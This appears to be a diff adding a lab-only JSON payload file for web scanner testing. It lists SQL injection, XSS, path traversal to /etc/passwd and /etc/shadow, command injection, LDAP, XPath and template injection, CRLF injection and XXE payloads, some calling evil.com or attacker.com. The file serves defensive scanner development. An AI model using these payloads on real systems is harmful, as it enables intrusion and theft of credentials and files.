@@ -1,0 +1,141 @@
+{
+  "WARNING": "These payloads are ONLY for lab environment testing. DO NOT use on production systems.",
+  "ENVIRONMENT": "lab_only",
+  "sql_injection": {
+    "error_based": {
+      "basic_quote": "'",
+      "double_quote": "\"",
+      "comment_injection": "'; --",
+      "union_select": "' UNION SELECT NULL--",
+      "boolean_true": "' OR '1'='1",
+      "boolean_false": "' OR '1'='2",
+      "error_function": "' AND (SELECT 1/0)--",
+      "mysql_version": "' AND (SELECT @@version)--",
+      "sqlite_error": "' AND (SELECT sqlite_version())--"
+    },
+    "time_based": {
+      "mysql_sleep": "'; SELECT SLEEP(5)--",
+      "mssql_waitfor": "'; WAITFOR DELAY '00:00:05'--",
+      "postgres_sleep": "'; SELECT pg_sleep(5)--",
+      "sqlite_delay": "'; SELECT randomblob(100000000)--"
+    },
+    "union_based": {
+      "basic_union": "' UNION SELECT NULL--",
+      "union_columns": "' UNION SELECT NULL,NULL,NULL--",
+      "union_data": "' UNION SELECT 'admin','password',NULL--"
+    }
+  },
+  "xss": {
+    "script_injection": {
+      "basic_alert": "<script>alert('XSS')</script>",
+      "basic_confirm": "<script>confirm('XSS')</script>",
+      "basic_prompt": "<script>prompt('XSS')</script>",
+      "console_log": "<script>console.log('XSS')</script>",
+      "document_write": "<script>document.write('XSS')</script>"
+    },
+    "event_handlers": {
+      "img_onerror": "<img src=x onerror=alert('XSS')>",
+      "svg_onload": "<svg onload=alert('XSS')>",
+      "body_onload": "<body onload=alert('XSS')>",
+      "input_onfocus": "<input onfocus=alert('XSS') autofocus>",
+      "details_ontoggle": "<details ontoggle=alert('XSS') open>"
+    },
+    "javascript_urls": {
+      "basic_javascript": "javascript:alert('XSS')",
+      "javascript_void": "javascript:void(alert('XSS'))",
+      "data_uri": "data:text/html,<script>alert('XSS')</script>"
+    },
+    "attribute_injection": {
+      "title_injection": "\" onmouseover=alert('XSS') \"",
+      "alt_injection": "\" onload=alert('XSS') \"",
+      "style_injection": "style=background:url(javascript:alert('XSS'))"
+    },
+    "context_breaking": {
+      "html_context": "</title><script>alert('XSS')</script>",
+      "script_context": "';alert('XSS');//",
+      "attribute_context": "\" onmouseover=alert('XSS') \"",
+      "comment_context": "--><script>alert('XSS')</script><!--"
+    }
+  },
+  "lfi": {
+    "unix_paths": {
+      "etc_passwd": "../../../../etc/passwd",
+      "etc_shadow": "../../../../etc/shadow",
+      "etc_hosts": "../../../../etc/hosts",
+      "proc_version": "../../../../proc/version",
+      "var_log": "../../../../var/log/apache2/access.log"
+    },
+    "windows_paths": {
+      "windows_hosts": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+      "boot_ini": "..\\..\\..\\boot.ini",
+      "system32": "..\\..\\..\\windows\\system32\\config\\system"
+    },
+    "php_wrappers": {
+      "php_filter": "php://filter/convert.base64-encode/resource=index.php",
+      "php_input": "php://input",
+      "data_wrapper": "data://text/plain,<?php phpinfo(); ?>"
+    },
+    "null_byte": {
+      "null_bypass": "../../../../etc/passwd%00",
+      "null_extension": "../../../../etc/passwd%00.jpg"
+    }
+  },
+  "command_injection": {
+    "unix_commands": {
+      "basic_id": "; id",
+      "pipe_whoami": "| whoami",
+      "and_ls": "& ls",
+      "background_sleep": "; sleep 5 &",
+      "command_substitution": "`id`",
+      "dollar_substitution": "$(id)"
+    },
+    "windows_commands": {
+      "and_dir": "& dir",
+      "pipe_type": "| type C:\\windows\\system32\\drivers\\etc\\hosts",
+      "basic_whoami": "& whoami",
+      "cmd_execution": "& cmd /c dir"
+    }
+  },
+  "ldap_injection": {
+    "authentication_bypass": {
+      "wildcard": "*",
+      "always_true": "*)(uid=*",
+      "comment_out": "*)(|(objectClass=*"
+    }
+  },
+  "xpath_injection": {
+    "authentication_bypass": {
+      "or_true": "' or '1'='1",
+      "comment_bypass": "' or 1=1 or ''='"
+    }
+  },
+  "template_injection": {
+    "jinja2": {
+      "basic_test": "{{7*7}}",
+      "config_access": "{{config}}",
+      "class_access": "{{''.__class__.__mro__[2].__subclasses__()}}"
+    },
+    "twig": {
+      "basic_test": "{{7*7}}",
+      "dump_function": "{{dump(app)}}"
+    }
+  },
+  "header_injection": {
+    "response_splitting": {
+      "crlf_injection": "\r\nSet-Cookie: admin=true",
+      "newline_injection": "\nLocation: http://evil.com"
+    }
+  },
+  "xxe": {
+    "external_entity": {
+      "file_disclosure": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "http_request": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
+    }
+  },
+  "usage_notes": {
+    "safety": "These payloads are designed for controlled lab testing only",
+    "scope": "Only use in isolated Docker lab environment",
+    "purpose": "Educational and scanner development testing",
+    "restrictions": "Never use against systems you do not own or lack authorization to test"
+  }
+} 
